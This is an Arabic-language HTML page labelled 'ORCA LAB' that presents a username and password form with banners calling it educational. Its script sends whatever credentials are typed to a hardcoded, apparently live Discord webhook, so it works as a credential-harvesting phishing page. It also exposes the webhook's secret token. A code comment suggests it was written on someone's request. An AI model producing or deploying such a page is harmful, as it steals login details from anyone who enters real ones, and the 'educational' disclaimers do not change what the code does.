<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ORCA · مكتبة البرمجة</title>
    <!-- Tailwind CSS للتصميم السريع -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: #0a0f1f;
            font-family: 'Cairo', 'Courier New', monospace;
        }
        .glass-card {
            background: rgba(10, 20, 30, 0.8);
            backdrop-filter: blur(12px);
            border: 2px solid #00ffcc;
            box-shadow: 0 0 30px rgba(0, 255, 204, 0.3);
        }
        .neon-text {
            color: #00ffcc;
            text-shadow: 0 0 10px #00ffcc;
        }
        .warning-box {
            background: #ffaa33;
            color: #0a0f1f;
            border-radius: 60px;
            padding: 12px 20px;
            font-weight: bold;
            border: 2px solid gold;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="glass-card rounded-3xl p-8 w-full max-w-md relative">
        <!-- تحذير علني واضح -->
        <div class="warning-box text-center mb-6">
            ⚠️ هذا الموقع لأغراض تعليمية · لا تدخل بيانات حقيقية ⚠️
        </div>

        <h1 class="text-4xl font-black text-center neon-text mb-2">ORCA LAB</h1>
        <p class="text-center text-cyan-700 mb-8">مختبر تعلم النماذج و Webhooks</p>

        <!-- النموذج التعليمي -->
        <form id="eduForm" class="space-y-5">
            <div>
                <label class="block text-cyan-300 text-sm mb-2">👤 اسم المستخدم (تجريبي)</label>
                <input type="text" id="username" placeholder="أدخل اسماً وهمياً" required 
                    class="w-full bg-black border border-cyan-800 rounded-xl p-4 text-cyan-400 outline-none focus:border-cyan-400">
            </div>
            <div>
                <label class="block text-cyan-300 text-sm mb-2">🔑 كلمة المرور (تجريبية)</label>
                <input type="password" id="password" placeholder="أدخل كلمة وهمية" required 
                    class="w-full bg-black border border-cyan-800 rounded-xl p-4 text-cyan-400 outline-none focus:border-cyan-400">
            </div>
            <button type="submit" 
                class="w-full bg-cyan-500 hover:bg-cyan-400 text-black font-bold py-4 rounded-xl transition-all transform hover:scale-105">
                ➤ إرسال البيانات (لأغراض تعليمية)
            </button>
        </form>

        <!-- رسالة النجاح (تظهر بعد الإرسال) -->
        <div id="successMsg" class="mt-6 text-center text-green-400 bg-green-900/30 p-3 rounded-xl hidden">
            ✅ تمت المحاكاة! شاهد قناة Discord لترى البيانات الوهمية.
        </div>

        <!-- تذييل مع تحذير إضافي -->
        <div class="mt-8 pt-4 border-t border-cyan-800/50 text-center text-xs text-red-500">
            هذا المختبر يوضح آلية عمل النماذج و Webhooks. البيانات لا تُرسل حقيقية أبداً.
        </div>
    </div>

    <script>
        // رابط Webhook الجديد الذي طلبته
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1482127411230409025/sGJI256xYlNVzwQCEwXILSISO_jM6vBiIOiAaen6XVSRObc_yuU1L4PaDHSlTxM7PxAn';

        // عند إرسال النموذج
        document.getElementById('eduForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // إنشاء رسالة تعليمية واضحة
            const embed = {
                title: '🧪 ORCA LAB - تجربة تعليمية',
                description: 'هذه رسالة وهمية لأغراض التعلم فقط. لا تمثل أي بيانات حقيقية.',
                color: 0x00ffcc,
                fields: [
                    { name: '👤 اسم المستخدم', value: `\`${username}\``, inline: true },
                    { name: '🔑 كلمة المرور', value: `\`${password}\``, inline: true }
                ],
                footer: { text: 'مختبر ORCA · جميع البيانات وهمية' },
                timestamp: new Date()
            };

            try {
                // إرسال البيانات إلى Discord (بيانات وهمية)
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });

                // إخفاء النموذج وإظهار رسالة النجاح
                document.getElementById('eduForm').style.display = 'none';
                document.getElementById('successMsg').classList.remove('hidden');

            } catch (error) {
                alert('❌ خطأ في الاتصال. تأكد من الرابط.');
                console.error(error);
            }
        });
    </script>
</body>
</html>
